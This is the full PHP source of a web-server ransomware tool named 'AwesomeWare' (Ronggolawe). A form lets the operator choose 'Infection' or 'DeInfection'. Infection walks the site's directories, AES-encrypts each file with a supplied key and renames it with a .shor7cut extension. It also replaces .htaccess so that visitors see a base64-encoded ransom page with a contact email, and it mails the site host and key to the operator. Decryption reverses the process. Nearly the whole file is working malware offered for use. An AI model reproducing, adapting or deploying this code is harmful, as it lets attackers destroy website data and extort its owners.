<!DOCTYPE html>
<html>
<head>
   <title>AwesomeWare</title>
<style type="text/css">
body {
    background: #1A1C1F;
    color: #e2e2e2;
}
.inpute{
    border-style: dotted;
    border-color: #379600;
    background-color: transparent;
    color: white;
    text-align: center;
}
.selecte{
    border-style: dotted;
    border-color: green;
    background-color: transparent;
    color: green;
}
.submite{
       border-style: dotted;
    border-color: #4CAF50;
    background-color: transparent;
    color: white;
}
.result{
  text-align: left;
}
</style>
<link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css">
</head>
<body>
<div class="result">
<?php
error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '-1');
class deRanSomeware
{
   public function shcpackInstall(){
    if(!file_exists(".htashor7cut")){
      rename(".htaccess", ".htashor7cut");
      if(fwrite(fopen('.htaccess', 'w'), "#Bug7sec Team\r\nDirectoryIndex shor7cut.php\r\nErrorDocument 404 /shor7cut.php")){
            echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"></i> .htaccess (Default Page)<br>';
      }
      if(file_put_contents("shor7cut.php", base64_decode("PCFET0NUWVBFIGh0bWw+DQo8aHRtbD4NCjxoZWFkPg0KICAgPHRpdGxlPkF3ZXNvbWVXYXJlPC90aXRsZT4NCjxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+DQpib2R5IHsNCiAgICBiYWNrZ3JvdW5kOiAjMUExQzFGOw0KICAgIGNvbG9yOiAjZTJlMmUyOw0KfQ0KYXsNCiAgIGNvbG9yOmdyZWVuOw0KfQ0KPC9zdHlsZT4NCjwvaGVhZD4NCjxib2R5Pg0KPGNlbnRlcj4NCjxwcmU+DQogICAgICANCiAgICAgICAgICAgIC4tIiItLg0KICAgICAgICAgICAvIC4tLS4gXA0KICAgICAgICAgIC8gLyAgICBcIFwNCiAgICAgICAgICB8IHwgICAgfCB8DQogICAgICAgICAgfCB8Li0iIi0ufA0KICAgICAgICAgLy8vYC46Ojo6LmBcDQogICAgICAgIHx8fCA6Oi8gIFw6OiA7DQogICAgICAgIHx8OyA6OlxfXy86OiA7DQogICAgICAgICBcXFwgJzo6OjonIC8NCiAgICAgICAgICBgPSc6LS4uLSdgDQpZb3VyIHNpdGUgaXMgbG9ja2VkLCBwbGVhc2UgY29udGFjdCB2aWEgZW1haWw6DQogICAgIC1bIDxmb250IGNvbG9yPSJncmVlbiI+dG8xMzM3ZGF5W2F0XWdtYWlsLmNvbTwvZm9udD4gXS0NCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NClRoaXMgaXMgYSBub3RpY2Ugb2YgPGEgaHJlZj0iaHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvUmFuc29td2FyZSI+cmFuc29td2FyZTwvYT4uPGJyPg0KSG93IHRvIHJlc3RvcmUgdGhlIGJlZ2lubmluZz8NClBsZWFzZSBjb250YWN0IHVzIHZpYSBlbWFpbCBsaXN0ZWQNCjwvcHJlPg0KPC9jZW50ZXI+DQo8L2JvZHk+DQo8L2h0bWw+"))){
            echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"></i>  shor7cut.php (Default Page)<br>';
      }
    }
   }
   public function shcpackUnstall(){

      if( file_exists(".htashor7cut") ){
        if( unlink(".htaccess") && unlink("shor7cut.php") ){
          echo '<i class="fa fa-thumbs-o-down" aria-hidden="true"></i> .htaccess (Default Page)<br>';
          echo '<i class="fa fa-thumbs-o-down" aria-hidden="true"></i> shor7cut.php (Default Page)<br>';
        }
        rename(".htashor7cut", ".htaccess");
      }

   }

   public function plus(){
      flush();
      ob_flush();
   }
   public function locate(){
        return getcwd();
    }
   public function shcdirs($dir,$method,$key){
        switch ($method) {
          case '1':
            deRanSomeware::shcpackInstall();
          break;
          case '2':
           deRanSomeware::shcpackUnstall();
          break;
        }
        foreach(scandir($dir) as $d)
        {
            if($d!='.' && $d!='..')
            {
                $locate = $dir.DIRECTORY_SEPARATOR.$d;
                if(!is_dir($locate)){
                   if(  deRanSomeware::kecuali($locate,"AwesomeWare.php")  && deRanSomeware::kecuali($locate,".png")  && deRanSomeware::kecuali($locate,".htaccess")  && deRanSomeware::kecuali($locate,"shor7cut.php") &&  deRanSomeware::kecuali($locate,"index.php") && deRanSomeware::kecuali($locate,".htashor7cut") ){
                     switch ($method) {
                        case '1':
                           deRanSomeware::shcEnCry($key,$locate);
                           deRanSomeware::shcEnDesDirS($locate,"1");
                        break;
                        case '2':
                           deRanSomeware::shcDeCry($key,$locate);
                           deRanSomeware::shcEnDesDirS($locate,"2");
                        break;
                     }
                   }
                }else{
                  deRanSomeware::shcdirs($locate,$method,$key);
                }
            }
            deRanSomeware::plus();
        }
        deRanSomeware::report($key);
   }

   public function report($key){
        $message.= "=========     Ronggolawe Ransomware    =========\n";
        $message.= "Website : ".$_SERVER['HTTP_HOST'];
        $message.= "Key     : ".$key;
        $message.= "========= Ronggolawe (2016) Ransomware =========\n";
        $subject = "Report Ransomeware";
        $headers = "From: Ransomware <ransomeware@shor7cut.today>\r\n";
        mail("-- YOUR EMAIL --",$subject,$message,$headers);
   }

   public function shcEnDesDirS($locate,$method){
      switch ($method) {
        case '1':
          rename($locate, $locate.".shor7cut");
        break;
        case '2':
          $locates = str_replace(".shor7cut", "", $locate);
          rename($locate, $locates);
        break;
      }
   }

   public function shcEnCry($key,$locate){
      $data = file_get_contents($locate);
      $iv = mcrypt_create_iv(
          mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC),
          MCRYPT_DEV_URANDOM
      );

      $encrypted = base64_encode(
          $iv .
          mcrypt_encrypt(
              MCRYPT_RIJNDAEL_128,
              hash('sha256', $key, true),
              $data,
              MCRYPT_MODE_CBC,
              $iv
          )
      );
      if(file_put_contents($locate,  $encrypted )){
         echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">Locked</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
      }else{
         echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">Locked</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> '.$locate.' <br>';
      }
   }

   public function shcDeCry($key,$locate){
      $data = base64_decode( file_get_contents($locate) );
      $iv = substr($data, 0, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC));

      $decrypted = rtrim(
          mcrypt_decrypt(
              MCRYPT_RIJNDAEL_128,
              hash('sha256', $key, true),
              substr($data, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC)),
              MCRYPT_MODE_CBC,
              $iv
          ),
          "\0"
      );
      if(file_put_contents($locate,  $decrypted )){
         echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B">Unlock</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
      }else{
         echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B">Unlock</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
      }
   }



   public function kecuali($ext,$name){
        $re = "/({$name})/";
        preg_match($re, $ext, $matches);
        if($matches[1]){
            return false;
        }
            return true;
     }
}

if($_POST['submit']){
switch ($_POST['method']) {
   case '1':
      deRanSomeware::shcdirs(deRanSomeware::locate(),"1",$_POST['key']);
   break;
   case '2':
     deRanSomeware::shcdirs(deRanSomeware::locate(),"2",$_POST['key']);
   break;
}
}else{
?>
<center>
<pre>

            .-""-.
           / .--. \
          / /    \ \
          | |    | |
          | |.-""-.|
         ///`.::::.`\
        ||| ::/  \:: ;
        ||; ::\__/:: ;
         \\\ '::::' /
     SHC  `=':-..-'`
        AwesomeWare
 -[ Contact : to1337day[at]gmail.com ]-
</pre>
<form action="" method="post" style=" text-align: center;">
      <label>Key : </label>
      <input type="text" name="key" class="inpute" placeholder="KEY ENC/DEC">
      <select name="method" class="selecte">
         <option value="1">Infection</option>
         <option value="2">DeInfection</option>
      </select>
      <input type="submit" name="submit" class="submite" value="Submit" />
</form>
<?php
}?>
</div>
</body>
</html>


<?php

?>
